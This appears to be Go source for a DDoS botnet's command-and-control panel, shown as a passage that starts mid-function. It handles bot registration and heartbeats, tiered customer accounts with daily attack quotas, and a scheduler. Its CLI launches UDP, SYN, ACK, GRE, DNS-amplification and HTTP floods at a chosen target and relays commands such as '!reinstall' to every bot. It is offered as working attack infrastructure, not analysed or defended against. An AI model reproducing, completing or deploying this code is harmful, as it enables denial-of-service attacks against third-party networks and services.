		{IP: net.ParseIP("fc00::"), Mask: net.CIDRMask(7, 128)},
		{IP: net.ParseIP("fe80::"), Mask: net.CIDRMask(10, 128)},
		{IP: net.ParseIP("224.0.0.0"), Mask: net.CIDRMask(4, 32)},
		{IP: net.ParseIP("240.0.0.0"), Mask: net.CIDRMask(4, 32)},
	}
	for _, b := range blocks {
		if b.Contains(ip) {
			return true
		}
	}
	return false
}

func concurrencyLimit(role string) int {
	switch role {
	case "Owner", "Admin":
		return 5
	case "Pro":
		return 3
	default:
		return 1
	}
}

func prettyMethod(m string) string {
	names := map[string]string{
		"!udpflood": "UDP Flood", "!udpsmart": "UDP Smart",
		"!tcpflood": "TCP Flood", "!synflood": "SYN Flood",
		"!ackflood": "ACK Flood", "!greflood": "GRE Flood",
		"!dns": "DNS Amplification", "!http": "HTTP Flood",
	}
	return names[m]
}

func networkPower(bots []Node) float64 {
	total := 0.0
	for _, n := range bots {
		bw := float64(n.Cores) * 70.0
		ramFactor := 1.0 + (n.RAM / 16.0)
		archFactor := 1.0
		lo := strings.ToLower(n.Arch)
		if strings.Contains(lo, "x86_64") {
			archFactor = 1.2
		} else if strings.Contains(lo, "arm") {
			archFactor = 0.7
		}
		total += bw * ramFactor * archFactor
	}
	gbps := total / 1000
	return math.Round(gbps*100) / 100
}

func onlineNodes() []Node {
	var out []Node
	for _, n := range nodes {
		if n.Conn != nil {
			out = append(out, n)
		}
	}
	return out
}

func runningTaskSummaries() []TaskSummary {
	var out []TaskSummary
	scheduler.mu.RLock()
	defer scheduler.mu.RUnlock()
	for _, t := range scheduler.active {
		rem := time.Until(t.StartedAt.Add(t.Duration))
		if rem <= 0 {
			continue
		}
		out = append(out, TaskSummary{
			Method:    t.Method,
			Target:    t.Target,
			Port:      t.Port,
			Duration:  fmt.Sprintf("%.0fs", t.Duration.Seconds()),
			Remaining: fmtDuration(rem),
			ID:        t.Method + "-" + t.Target + "-" + t.Port,
		})
	}
	return out
}

func fmtDuration(d time.Duration) string {
	h := int(d.Hours())
	m := int(d.Minutes()) % 60
	s := int(d.Seconds()) % 60
	if h > 0 {
		return fmt.Sprintf("%dh%dm%ds", h, m, s)
	} else if m > 0 {
		return fmt.Sprintf("%dm%ds", m, s)
	}
	return fmt.Sprintf("%ds", s)
}

// ---------------------------------------------------------------------------
// web session helpers
// ---------------------------------------------------------------------------

func cookieSession(r *http.Request) string {
	c, err := r.Cookie("session")
	if err != nil {
		return ""
	}
	return c.Value
}

func storeSession(id string, acct Account) {
	webMu.Lock()
	defer webMu.Unlock()
	webSessions[id] = acct
}

func fetchSession(id string) (Account, bool) {
	webMu.Lock()
	defer webMu.Unlock()
	acct, ok := webSessions[id]
	if !ok {
		return Account{}, false
	}
	if time.Since(acct.Expire) > cfg.SessionTTL {
		delete(webSessions, id)
		return Account{}, false
	}
	return acct, true
}

func dropSession(id string) {
	webMu.Lock()
	defer webMu.Unlock()
	delete(webSessions, id)
}

// ---------------------------------------------------------------------------
// tls + cert generation
// ---------------------------------------------------------------------------

func pathExists(p string) bool {
	_, err := os.Stat(p)
	return err == nil
}

func generateSelfSignedCert() {
	c := &x509.Certificate{
		SerialNumber: big.NewInt(1),
		Subject:      pkix.Name{CommonName: "localhost"},
		NotBefore:    time.Now(),
		NotAfter:     time.Now().AddDate(1, 0, 0),
		KeyUsage:     x509.KeyUsageKeyEncipherment | x509.KeyUsageDigitalSignature,
		ExtKeyUsage:  []x509.ExtKeyUsage{x509.ExtKeyUsageServerAuth},
	}
	priv, _ := rsa.GenerateKey(rand.Reader, 2048)
	der, _ := x509.CreateCertificate(rand.Reader, c, c, &priv.PublicKey, priv)

	cf, _ := os.Create(cfg.TLSCert)
	pem.Encode(cf, &pem.Block{Type: "CERTIFICATE", Bytes: der})
	cf.Close()

	kf, _ := os.OpenFile(cfg.TLSKey, os.O_WRONLY|os.O_CREATE|os.O_TRUNC, 0600)
	pem.Encode(kf, &pem.Block{Type: "RSA PRIVATE KEY", Bytes: x509.MarshalPKCS1PrivateKey(priv)})
	kf.Close()
}

func readConfig() (*ServerConfig, error) {
	raw, err := os.ReadFile("config.json")
	if err != nil {
		return nil, err
	}
	var c ServerConfig
	if err := json.Unmarshal(raw, &c); err != nil {
		return nil, err
	}
	return &c, nil
}

func checkConfig() error {
	if cfg.MaxConnections <= 0 || cfg.MaxMsgSize <= 0 || cfg.MaxTaskSeconds <= 0 {
		return fmt.Errorf("invalid config values")
	}
	if cfg.MinPassLen < 8 || cfg.ResetTokenTTL <= 0 {
		return fmt.Errorf("invalid security settings")
	}
	return nil
}

func bootstrapAdmin() {
	accts := []Account{}
	if raw, err := os.ReadFile(cfg.AccountsPath); err == nil {
		json.Unmarshal(raw, &accts)
	}
	for _, a := range accts {
		if a.Username == "root" {
			return
		}
	}

	pw := secureToken(16)
	hash, _ := bcrypt.GenerateFromPassword([]byte(pw), bcrypt.DefaultCost)
	key := secureToken(64)
	accts = append(accts, Account{
		Username:     "root",
		PasswordHash: string(hash),
		APIKey:       key,
		Expire:       time.Now().AddDate(10, 0, 0),
		Level:        "Owner",
		CreatedAt:    time.Now(),
		Credits:      -1,
		Transactions: []TransactionLog{},
	})
	persistAccounts(accts)

	printTagged("SYSTEM", fmt.Sprintf(`
        ┌──────────────────────────────────────────────┐
        │            ROOT USER CREATED                 │
        ├──────────────────────────────────────────────┤
        │ Username: root                               │
        │ Password: %-32s │
        │ API Key:  %-32s │
        └──────────────────────────────────────────────┘
        `, pw, key))
}

func printTagged(source, msg string) {
	logMu.Lock()
	defer logMu.Unlock()
	ts := time.Now().Format("2006-01-02 15:04:05")
	cc := "37"
	switch source {
	case "SYSTEM":
		cc = "36"
	case "NODE":
		cc = "33"
	case "NODE_RAW":
		cc = "35"
	case "NODE_LOG":
		cc = "32"
	case "ATTACK":
		cc = "31"
	}
	fmt.Printf("\033[%sm[%s] [%s] %s\033[0m\n", cc, ts, source, msg)
}

func buildServerTLS() *tls.Config {
	pair, err := tls.LoadX509KeyPair(cfg.TLSCert, cfg.TLSKey)
	if err != nil {
		return nil
	}
	return &tls.Config{
		Certificates:     []tls.Certificate{pair},
		MinVersion:       tls.VersionTLS13,
		CipherSuites:     []uint16{tls.TLS_AES_128_GCM_SHA256, tls.TLS_AES_256_GCM_SHA384},
		CurvePreferences: []tls.CurveID{tls.X25519, tls.CurveP256},
	}
}

// ---------------------------------------------------------------------------
// node management
// ---------------------------------------------------------------------------

func updateNodeHW(c net.Conn, arch, coreStr, ramStr string) {
	nodeMu.Lock()
	defer nodeMu.Unlock()
	for i, n := range nodes {
		if n.Conn == c {
			nodes[i].Arch = arch
			if v, err := strconv.Atoi(coreStr); err == nil {
				nodes[i].Cores = v
			}
			if v, err := strconv.ParseFloat(ramStr, 64); err == nil {
				nodes[i].RAM = v
			}
			break
		}
	}
}

func touchNode(c net.Conn) {
	nodeMu.Lock()
	defer nodeMu.Unlock()
	for i, n := range nodes {
		if n.Conn == c {
			nodes[i].LastHeartbeat = time.Now()
			break
		}
	}
}

func detachNode(c net.Conn) {
	nodeMu.Lock()
	defer nodeMu.Unlock()
	for i, n := range nodes {
		if n.Conn == c {
			nodes = append(nodes[:i], nodes[i+1:]...)
			break
		}
	}
	for i, nc := range nodeConns {
		if nc == c {
			nodeConns = append(nodeConns[:i], nodeConns[i+1:]...)
			break
		}
	}
}

func countNodes() int {
	nodeMu.Lock()
	defer nodeMu.Unlock()
	return len(nodes)
}

// ---------------------------------------------------------------------------
// account persistence
// ---------------------------------------------------------------------------

func loadAccounts() []Account {
	raw, _ := os.ReadFile(cfg.AccountsPath)
	var out []Account
	json.Unmarshal(raw, &out)
	return out
}

func persistAccounts(accts []Account) error {
	data, _ := json.MarshalIndent(accts, "", "  ")
	return os.WriteFile(cfg.AccountsPath, data, 0600)
}

// ---------------------------------------------------------------------------
// firewall
// ---------------------------------------------------------------------------

func applyFirewallRules() error {
	if !cfg.EnableFirewall {
		return nil
	}
	rules := []string{
		"iptables -N ANTIDDOS",
		"iptables -A ANTIDDOS -p tcp --syn -m limit --limit 1/s --limit-burst 3 -j RETURN",
		"iptables -A ANTIDDOS -p tcp --syn -j DROP",
		"iptables -A ANTIDDOS -p tcp -m conntrack --ctstate NEW -m limit --limit 1/s --limit-burst 3 -j RETURN",
		"iptables -A ANTIDDOS -p tcp -m conntrack --ctstate NEW -j DROP",
		"iptables -A ANTIDDOS -p udp -m limit --limit 1/s --limit-burst 3 -j RETURN",
		"iptables -A ANTIDDOS -p udp -j DROP",
		"iptables -I INPUT -j ANTIDDOS",
	}
	for _, r := range rules {
		if err := exec.Command("sh", "-c", r).Run(); err != nil {
			return fmt.Errorf("iptables: %v", err)
		}
	}
	return nil
}

// ---------------------------------------------------------------------------
// background cleanup goroutines
// ---------------------------------------------------------------------------

func reapSessions() {
	tick := time.NewTicker(5 * time.Minute)
	defer tick.Stop()
	for range tick.C {
		now := time.Now()
		cliRegistry.forEach(func(key, val interface{}) bool {
			s := val.(*cliState)
			if now.Sub(s.lastActive) > cfg.SessionTTL || now.After(s.expires) {
				if k, ok := key.(string); ok {
					cliRegistry.del(k)
				}
				cliCountMu.Lock()
				cliCountPerUser[s.client.acct.Username]--
				cliCountMu.Unlock()
			}
			return true
		})
	}
}

func reapBuckets() {
	tick := time.NewTicker(5 * time.Minute)
	defer tick.Stop()
	for range tick.C {
		bucketMu.Lock()
		now := time.Now()
		for k, b := range ipBuckets {
			if now.Sub(b.seen) > 5*time.Minute {
				delete(ipBuckets, k)
			}
		}
		for k, b := range userBuckets {
			if now.Sub(b.seen) > 5*time.Minute {
				delete(userBuckets, k)
			}
		}
		bucketMu.Unlock()
	}
}

func reapBlocklist() {
	tick := time.NewTicker(1 * time.Hour)
	defer tick.Stop()
	for range tick.C {
		blockMu.Lock()
		for ip, t := range blocklist {
			if time.Since(t) > 24*time.Hour {
				delete(blocklist, ip)
			}
		}
		blockMu.Unlock()
	}
}

func rotateAuditLog() {
	tick := time.NewTicker(1 * time.Hour)
	defer tick.Stop()
	for range tick.C {
		if info, err := os.Stat(cfg.AuditPath); err == nil && info.Size() > cfg.MaxAuditBytes {
			if err := os.Remove(cfg.AuditPath + ".old"); err == nil || os.IsNotExist(err) {
				os.Rename(cfg.AuditPath, cfg.AuditPath+".old")
			}
		}
	}
}

func refreshTitle() {
	glyphs := []rune{'⣾', '⣽', '⣻', '⢿', '⡿', '⣟', '⣯', '⣷'}
	idx := 0
	tick := time.NewTicker(1 * time.Second)
	defer tick.Stop()

	for range tick.C {
		nTasks := scheduler.count()
		nNodes := countNodes()
		up := time.Since(startedAt).Round(time.Second)

		for _, cli := range cliClients {
			g := glyphs[idx]
			bar := fmt.Sprintf("%c━━━%c━━[User: %s]━━%c━━[Bots: %d]━━%c━━[Attacks: %d/%d]━━%c━━[Uptime: %s]━━%c━━━%c",
				g, g, cli.acct.Username, g, nNodes, g, nTasks, scheduler.cap(), g, up, g, g)
			cli.conn.Write([]byte(fmt.Sprintf("\033]0;%s\007", bar)))
		}
		idx = (idx + 1) % len(glyphs)
	}
}

func systemHealthLoop() {
	tick := time.NewTicker(30 * time.Minute)
	defer tick.Stop()
	for range tick.C {
		msg := fmt.Sprintf("System stats - Load: %.2f, RAM: %.2fGB, Uptime: %.2fh, Cores: %d",
			readLoadAvg(), readMemGB(), readUptime()/3600, runtime.NumCPU())
		auditWrite("SYSTEM", "STATS", msg)
	}
}

func readMemGB() float64 {
	raw, err := os.ReadFile("/proc/meminfo")
	if err != nil {
		return 0
	}
	for _, ln := range strings.Split(string(raw), "\n") {
		if strings.HasPrefix(ln, "MemTotal:") {
			f := strings.Fields(ln)
			if len(f) >= 2 {
				kb, _ := strconv.ParseFloat(f[1], 64)
				return kb / 1024 / 1024
			}
		}
	}
	return 0
}

func readLoadAvg() float64 {
	raw, err := os.ReadFile("/proc/loadavg")
	if err != nil {
		return 0
	}
	f := strings.Fields(string(raw))
	v, _ := strconv.ParseFloat(f[0], 64)
	return v
}

func readUptime() float64 {
	raw, err := os.ReadFile("/proc/uptime")
	if err != nil {
		return 0
	}
	f := strings.Fields(string(raw))
	v, _ := strconv.ParseFloat(f[0], 64)
	return v
}

func auditWrite(user, event, details string) {
	entry := fmt.Sprintf("[%s] %s: %s - %s",
		time.Now().Format("2006-01-02 15:04:05"), user, event, details)
	fmt.Println(entry)

	fh, err := os.OpenFile(cfg.AuditPath, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0600)
	if err == nil {
		fmt.Fprintln(fh, entry)
		fh.Close()
	}
}

// ---------------------------------------------------------------------------
// cli dispatch
// ---------------------------------------------------------------------------

func routeCLI(c net.Conn) {
	rd := bufio.NewReader(c)
	c.Write([]byte("\033]0;Authentication Required\007"))

	first, err := rd.ReadString('\n')
	if err != nil {
		return
	}
	first = strings.TrimSpace(first)
	if strings.HasPrefix(first, "PONG") {
		handleNodePong(c, first)
		return
	}
	if strings.HasPrefix(first, "loginforme") {
		if ok, cli := loginCLI(c); ok {
			cliLoop(c, cli)
		}
	}
}

func cliLoop(c net.Conn, cli *CLISession) {
	defer func() {
		cliCountMu.Lock()
		cliCountPerUser[cli.acct.Username]--
		cliCountMu.Unlock()
		cliRegistry.del(cli.sid)
		cli.cancel()
		c.Close()
	}()

	rd := bufio.NewReader(c)
	for {
		c.Write([]byte(cliPrompt(cli.acct.roleLevel())))

		line, err := rd.ReadString('\n')
		if err != nil {
			break
		}
		line = strings.TrimSpace(line)
		if line == "" {
			continue
		}
		tokens := strings.Fields(line)
		if len(tokens) < 1 {
			continue
		}

		ipRL := fetchIPBucket(cli.addr)
		uRL := fetchUserBucket(cli.acct.Username)
		if !ipRL.rl.Allow() || !uRL.rl.Allow() {
			c.Write([]byte("Rate limit exceeded. Please wait...\n"))
			continue
		}
		if time.Since(cli.lastCmd) < 2*time.Second {
			c.Write([]byte("Command too fast. Please wait...\n"))
			continue
		}
		cli.lastCmd = time.Now()

		cmd := strings.ToLower(tokens[0])
		switch cmd {
		case "!udpflood", "!udpsmart", "!tcpflood", "!synflood", "!ackflood", "!greflood", "!dns", "!http":
			cliLaunchTask(c, tokens, cli)
		case "ongoing":
			cliShowActive(c)
		case "queue":
			cliShowQueue(c, cli)
		case "cancel":
			cliCancelQueued(c, tokens, cli)
		case "peers", "bot":
			cliShowNodes(c)
		case "cls", "clear":
			c.Write([]byte("\033[2J\033[H"))
		case "logout", "exit":
			return
		case "!reinstall":
			if cli.acct.roleLevel() <= 1 {
				relayToNodes("!reinstall", cli.acct.Username)
			}
		case "help":
			cliHelp(c, cli.acct.roleLevel())
		case "db":
			if cli.acct.roleLevel() <= 1 {
				cliListAccounts(c)
			}
		case "logs":
			if cli.acct.roleLevel() <= 1 {
				cliShowAudit(c)
			}
		case "adduser":
			if cli.acct.roleLevel() <= 1 {
				cliAddAccount(c, tokens)
			}
		case "deluser":
			if cli.acct.roleLevel() <= 1 {
				cliDeleteAccount(c, tokens)
			}
		case "resetpw":
			cliResetPassword(c, cli, tokens)
		case "?":
			cliListMethods(c)
		case "status":
			cliServerInfo(c)
		case "stop":
			scheduler.cancelByConn(c)
		case "stats":
			cliNodePerf(c)
		default:
			c.Write([]byte("Unknown command. Type 'help' for available commands.\n"))
		}
	}
}

func (a *Account) roleLevel() int {
	switch a.Level {
	case "Owner":
		return 0
	case "Admin":
		return 1
	case "Pro":
		return 2
	default:
		return 3
	}
}

func cliPrompt(level int) string {
	var label, color string
	switch level {
	case 0:
		label, color = "OWNER", "183"
	case 1:
		label, color = "ADMIN", "251"
	case 2:
		label, color = "PRO", "243"
	default:
		label, color = "BASIC", "240"
	}
	return fmt.Sprintf("\n\r\033[38;5;240m[\033[38;5;237mGo\033[38;5;243mFl\033[38;5;246mod\033[38;5;240m]@[%s]\033[38;5;114m► \033[0m",
		colorize(label, color))
}

func colorize(text, code string) string {
	return fmt.Sprintf("\033[38;5;%sm%s\033[0m", code, text)
}

func relayToNodes(cmd, user string) {
	auditWrite(user, "COMMAND", fmt.Sprintf("Sent command to nodes: %s", cmd))
	for _, nc := range nodeConns {
		if _, err := nc.Write([]byte(cmd + "\r\n")); err != nil {
			printTagged("NODE", fmt.Sprintf("relay error to %s: %v", nc.RemoteAddr(), err))
		}
	}
}

func detachCLI(c net.Conn) {
	for i, cli := range cliClients {
		if cli.conn == c {
			cliClients = append(cliClients[:i], cliClients[i+1:]...)
			break
		}
	}
}

// ---------------------------------------------------------------------------
// rate limiting
// ---------------------------------------------------------------------------

func fetchIPBucket(ip string) *RateBucket {
	bucketMu.Lock()
	defer bucketMu.Unlock()
	if b, ok := ipBuckets[ip]; ok {
		b.seen = time.Now()
		return b
	}
	b := &RateBucket{rl: rate.NewLimiter(rate.Every(200*time.Millisecond), 5), seen: time.Now()}
	ipBuckets[ip] = b
	return b
}

func fetchUserBucket(uname string) *RateBucket {
	bucketMu.Lock()
	defer bucketMu.Unlock()
	if b, ok := userBuckets[uname]; ok {
		b.seen = time.Now()
		return b
	}
	lim := rate.Every(1 * time.Second)
	burst := 10
	daily := cfg.DailyTaskCap
	accts := []Account{}
	if raw, err := os.ReadFile(cfg.AccountsPath); err == nil {
		json.Unmarshal(raw, &accts)
		for _, a := range accts {
			if a.Username == uname {
				switch a.Level {
				case "Owner":
					lim = rate.Every(500 * time.Millisecond)
					burst = 20
					daily = cfg.DailyTaskCap * 3
				case "Admin":
					lim = rate.Every(750 * time.Millisecond)
					burst = 15
					daily = cfg.DailyTaskCap * 2
				}
				break
			}
		}
	}
	b := &RateBucket{
		rl: rate.NewLimiter(lim, burst), seen: time.Now(),
		todayCount: 0, dayStart: time.Now(), dailyCap: daily,
	}
	userBuckets[uname] = b
	return b
}

func (rb *RateBucket) hasQuota() bool {
	if time.Now().Day() != rb.dayStart.Day() {
		rb.todayCount = 0
		rb.dayStart = time.Now()
	}
	return rb.todayCount < rb.dailyCap
}

func collectFleetStats() FleetSummary {
	metricsMu.Lock()
	defer metricsMu.Unlock()
	var fs FleetSummary
	count := 0
	for _, m := range fleetMetrics {
		fs.AvgLatency += m.Latency
		fs.AvgThroughput += m.Throughput
		fs.TotalRAM += m.RAM
		fs.TotalCores += m.Cores
		count++
	}
	if count > 0 {
		fs.AvgLatency /= time.Duration(count)
		fs.AvgThroughput /= float64(count)
	}
	fs.Healthy = count
	fs.Unhealthy = countNodes() - count
	return fs
}

func handleNodePong(c net.Conn, line string) {
	ip := c.RemoteAddr().(*net.TCPAddr).IP.String()
	parts := strings.Split(line, ":")
	if len(parts) < 3 {
		return
	}
	archHex, _ := hex.DecodeString(parts[1])
	statsHex, _ := hex.DecodeString(parts[2])
	sp := strings.Split(string(statsHex), "|")
	if len(sp) < 4 {
		return
	}
	latSec, _ := strconv.ParseFloat(sp[0], 64)
	lat := time.Duration(latSec * float64(time.Second))
	thr, _ := strconv.ParseFloat(sp[1], 64)
	ram, _ := strconv.ParseFloat(sp[2], 64)
	cores, _ := strconv.Atoi(sp[3])
	metricsMu.Lock()
	fleetMetrics[ip] = NodeMetrics{
		Seen: time.Now(), Latency: lat, Throughput: thr,
		RAM: ram, Cores: cores, Architecture: string(archHex),
	}
	metricsMu.Unlock()
}

// ---------------------------------------------------------------------------
// cli: task operations
// ---------------------------------------------------------------------------

func cliLaunchTask(c net.Conn, tokens []string, cli *CLISession) {
	if cli.acct.roleLevel() > 2 {
		ok := map[string]bool{"!udpflood": true, "!tcpflood": true}
		if !ok[tokens[0]] {
			return
		}
	}
	if len(tokens) < 4 {
		return
	}
	method, ip, port, durStr := tokens[0], tokens[1], tokens[2], tokens[3]
	if !knownMethods[method] {
		return
	}
	if !safeTargetIP(ip) || !validPort(port) || !safeDuration(durStr) {
		return
	}

	dur, _ := time.ParseDuration(durStr + "s")
	ub := fetchUserBucket(cli.acct.Username)
	if !ub.hasQuota() {
		return
	}
	ub.todayCount++

	printTaskBanner(c, method, ip, port, durStr)
	auditWrite(cli.acct.Username, "ATTACK",
		fmt.Sprintf("Launched %s attack on %s:%s for %s seconds", method, ip, port, durStr))

	prio := 0
	switch cli.acct.roleLevel() {
	case 0:
		prio = 3
	case 1:
		prio = 2
	case 2:
		prio = 1
	}
	t := Task{
		Method: method, Target: ip, Port: port, Duration: dur, StartedAt: time.Now(),
		Owner: cli.acct.Username, Conn: c, QueuedAt: time.Now(), Priority: prio,
		Signature: signPayload(fmt.Sprintf("%s %s %s %d", method, ip, port, int(dur.Seconds()))),
	}

	scheduler.mu.Lock()
	defer scheduler.mu.Unlock()
	if len(scheduler.active) >= scheduler.cap() {
		if len(scheduler.pending) >= cfg.MaxPendingTasks {
			return
		}
		scheduler.pending = append(scheduler.pending, t)
		return
	}
	executeTask(c, t)
}

func cliShowQueue(c net.Conn, cli *CLISession) {
	items := scheduler.userPending(cli.acct.Username)
	if len(items) == 0 {
		slowPrint(c, "No queued attacks found.\n\r", 15*time.Millisecond, ansiBlue)
		return
	}
	c.Write([]byte("\033[2J\033[3J\033[2J\033[H"))
	bdr := tableBorder()
	c.Write([]byte(bdr))
	c.Write([]byte(fmt.Sprintf("\033[38;5;%sm|\033[38;5;%sm    QUEUED ATTACKS    \033[0m\n\r", ansiBase, ansiBright)))
	c.Write([]byte(bdr))
	c.Write([]byte(fmt.Sprintf("\033[38;5;%sm| %-3s | %-9s | %-15s | %-5s | %-8s | %-10s |\033[0m\n\r",
		ansiBase, "ID", "Method", "Target", "Port", "Duration", "Queued For")))
	c.Write([]byte(bdr))
	for i, t := range items {
		c.Write([]byte(fmt.Sprintf("\033[38;5;%sm| %-3d | %-9s | %-15s | %-5s | %-8ds | %-10s |\033[0m\n\r",
			ansiMid, i+1, t.Method, t.Target, t.Port, int(t.Duration.Seconds()),
			time.Since(t.QueuedAt).Round(time.Second))))
	}
	c.Write([]byte(bdr))
	slowPrint(c, "Use 'cancel <ID>' to remove a queued attack", 15*time.Millisecond, ansiBlue)
}

func cliCancelQueued(c net.Conn, tokens []string, cli *CLISession) {
	if len(tokens) < 2 {
		slowPrint(c, "Usage: cancel <queue ID>", 15*time.Millisecond, ansiRed)
		return
	}
	n, _ := strconv.Atoi(tokens[1])
	if n < 1 {
		slowPrint(c, "Invalid queue ID", 15*time.Millisecond, ansiRed)
		return
	}
	if scheduler.removePending(cli.acct.Username, n-1) {
		slowPrint(c, fmt.Sprintf("Cancelled queued attack #%d", n), 15*time.Millisecond, ansiGreen)
	} else {
		slowPrint(c, fmt.Sprintf("No queued attack found with ID %d", n), 15*time.Millisecond, ansiRed)
	}
}

func slowPrint(c net.Conn, text string, delay time.Duration, color string) {
	c.Write([]byte(fmt.Sprintf("\033[38;5;%sm", color)))
	for i := 0; i < len(text); i++ {
		c.Write([]byte{text[i]})
		time.Sleep(delay)
		if i%10 == 0 {
			if f, ok := c.(interface{ Flush() error }); ok {
				f.Flush()
			}
		}
	}
	c.Write([]byte("\033[0m\r\n"))
	if f, ok := c.(interface{ Flush() error }); ok {
		f.Flush()
	}
}

func tableBorder() string {
	return fmt.Sprintf("\033[38;5;%sm+\033[38;5;%sm-\033[38;5;%sm-\033[38;5;%sm-\033[38;5;%sm-\033[0m\n\r",
		ansiDim, ansiBase, ansiMid, ansiHi, ansiPale)
}

func printTaskBanner(c net.Conn, method, ip, port, dur string) {
	c.Write([]byte("\033[2J\033[H"))
	bdr := tableBorder()
	c.Write([]byte(bdr))
	c.Write([]byte(fmt.Sprintf("\033[38;5;%sm|\033[38;5;%sm    ATTACK LAUNCHED    \033[0m\n", ansiBase, ansiBright)))
	c.Write([]byte(bdr))
	c.Write([]byte(fmt.Sprintf("\033[38;5;%sm| Method: \033[38;5;%sm%s\033[0m\n\r", ansiBase, ansiWhite, method)))
	c.Write([]byte(fmt.Sprintf("\033[38;5;%sm| Target: \033[38;5;%sm%s:%s\033[0m\n\r", ansiBase, ansiWhite, ip, port)))
	c.Write([]byte(fmt.Sprintf("\033[38;5;%sm| Duration: \033[38;5;%sm%s seconds\033[0m\n\r", ansiBase, ansiWhite, dur)))
	c.Write([]byte(fmt.Sprintf("\033[38;5;%sm| Bots: \033[38;5;%sm%d\033[0m\n\r", ansiBase, ansiWhite, countNodes())))
	c.Write([]byte(bdr))
}

func cliShowActive(c net.Conn) {
	tasks := scheduler.allActive()
	if len(tasks) == 0 {
		slowPrint(c, "No ongoing attacks found.\n\r", 15*time.Millisecond, ansiBlue)
		return
	}
	c.Write([]byte("\033[2J\033[H"))
	bdr := tableBorder()
	c.Write([]byte(bdr))
	c.Write([]byte(fmt.Sprintf("\033[38;5;%sm|\033[38;5;%sm    ONGOING ATTACKS    \033[0m\n\r", ansiBase, ansiBright)))
	c.Write([]byte(bdr))
	c.Write([]byte(fmt.Sprintf("\033[38;5;%sm| %-9s | %-10s | %-5s | %-8s | %-15s | %-15s |\033[0m\n\r",
		ansiBase, "Method", "Target", "Port", "Duration", "Time Remaining", "User")))
	c.Write([]byte(bdr))
	for _, t := range tasks {
		rem := time.Until(t.StartedAt.Add(t.Duration))
		if rem > 0 {
			c.Write([]byte(fmt.Sprintf("\033[38;5;%sm| %-9s | %-10s | %-5s | %-8ds | %-15s | %-15s |\033[0m\n\r",
				ansiMid, t.Method, t.Target, t.Port, int(t.Duration.Seconds()),
				rem.Round(time.Second), t.Owner)))
		}
	}
	c.Write([]byte(bdr))
}

func cliShowNodes(c net.Conn) {
	n := countNodes()
	c.Write([]byte("\033[2J\033[H"))
	bdr := tableBorder()
	c.Write([]byte(bdr))
	c.Write([]byte(fmt.Sprintf("\033[38;5;%sm|\033[38;5;%sm    CONNECTED BOTS    \033[0m\n\r", ansiBase, ansiBright)))
	c.Write([]byte(bdr))
	c.Write([]byte(fmt.Sprintf("\033[38;5;%sm| Total peers online: \033[38;5;%sm%d\033[0m\n\r", ansiBase, ansiWhite, n)))
	c.Write([]byte(bdr))
}

func cliHelp(c net.Conn, level int) {
	c.Write([]byte("\033[2J\033[H"))
	bdr := tableBorder()
	c.Write([]byte(bdr))
	c.Write([]byte(fmt.Sprintf("\033[38;5;%sm|\033[38;5;%sm    HELP    \033[0m\n\r", ansiBase, ansiBright)))
	c.Write([]byte(bdr))
	cmds := []struct{ cmd, desc string }{
		{"?", "See all the different attack methods"},
		{"![method]", "Start an attack (method ip port duration)"},
		{"queue", "View your queued attacks"},
		{"cancel", "Cancel a queued attack (cancel <ID>)"},
		{"stop", "Stop an ongoing attack"},
		{"peers/bot", "Display connected peers count"},
		{"help", "Display this help message"},
		{"!reinstall", "Send reinstall command to all peers"},
		{"ongoing", "See all Current running attacks"},
		{"status", "Show server status information"},
		{"stats", "View bot performance stats"},
	}
	for _, e := range cmds {
		c.Write([]byte(fmt.Sprintf("\033[38;5;%sm| \033[38;5;%sm%-15s \033[38;5;%sm- %s\033[0m\n\r",
			ansiBase, ansiWhite, e.cmd, ansiBright, e.desc)))
	}
	if level <= 1 {
		c.Write([]byte(bdr))
		c.Write([]byte(fmt.Sprintf("\033[38;5;%sm|\033[38;5;%sm    ADMIN COMMANDS    \033[0m\n\r", ansiBase, ansiViolet)))
		c.Write([]byte(bdr))
		admin := []struct{ cmd, desc string }{
			{"db", "Fetch all user login info"},
			{"logs", "View system record logs"},
			{"adduser", "Create a new user (adduser <username> <level>)"},
			{"deluser", "Delete a user (deluser <username>)"},
			{"resetpw", "Reset a user's password (resetpw <username>)"},
		}
		for _, e := range admin {
			c.Write([]byte(fmt.Sprintf("\033[38;5;%sm| \033[38;5;%sm%-15s \033[38;5;%sm- %s\033[0m\n\r",
				ansiBase, ansiViolet, e.cmd, ansiViolet, e.desc)))
		}
	}
	c.Write([]byte(bdr))
}

func cliListAccounts(c net.Conn) {
	fh, _ := os.Open(cfg.AccountsPath)
	defer fh.Close()
	raw, _ := io.ReadAll(fh)
	var accts []Account
	json.Unmarshal(raw, &accts)

	c.Write([]byte("\033[2J\033[H"))
	bdr := tableBorder()
	c.Write([]byte(bdr))
	c.Write([]byte(fmt.Sprintf("\033[38;5;%sm|\033[38;5;%sm    USER DATABASE    \033[0m\n\r", ansiBase, ansiViolet)))
	c.Write([]byte(bdr))
	c.Write([]byte(fmt.Sprintf("\033[38;5;%sm| %-14s | %-14s | %-19s | %-10s | %-19s |\033[0m\n\r",
		ansiBase, "Username", "Password", "Expiration", "Level", "Last Activity")))
	c.Write([]byte(bdr))
	for _, a := range accts {
		c.Write([]byte(fmt.Sprintf("\033[38;5;%sm| %-14s | %-14s | %-19s | %-10s | %-19s |\033[0m\n\r",
			ansiMid, a.Username, "********", a.Expire.Format("2006-01-02"),
			a.Level, a.LastActivity.Format("2006-01-02 15:04"))))
	}
	c.Write([]byte(bdr))
}

func cliAddAccount(c net.Conn, tokens []string) {
	if len(tokens) < 3 {
		slowPrint(c, "Usage: adduser <username> <level>", 15*time.Millisecond, ansiRed)
		return
	}
	uname := sanitizeInput(tokens[1])
	raw := strings.ToLower(tokens[2])
	var role string
	switch raw {
	case "owner":
		role = "Owner"
	case "admin":
		role = "Admin"
	case "pro":
		role = "Pro"
	case "basic":
		role = "Basic"
	default:
		slowPrint(c, "Invalid level. Must be owner, admin, pro, or basic", 15*time.Millisecond, ansiRed)
		return
	}
	accts := loadAccounts()
	for _, a := range accts {
		if a.Username == uname {
			return
		}
	}
	pw := secureToken(12)
	key := secureToken(64)
	hash, _ := bcrypt.GenerateFromPassword([]byte(pw), bcrypt.DefaultCost)
	accts = append(accts, Account{
		Username: uname, PasswordHash: string(hash), APIKey: key,
		Expire: time.Now().AddDate(1, 0, 0), Level: role,
		CreatedAt: time.Now(), LastActivity: time.Now(),
	})
	persistAccounts(accts)
	auditWrite("SYSTEM", "USER", fmt.Sprintf("User %s created with level %s", uname, role))
	slowPrint(c, fmt.Sprintf("User %s created successfully with password: %s", uname, pw), 15*time.Millisecond, ansiGreen)
}

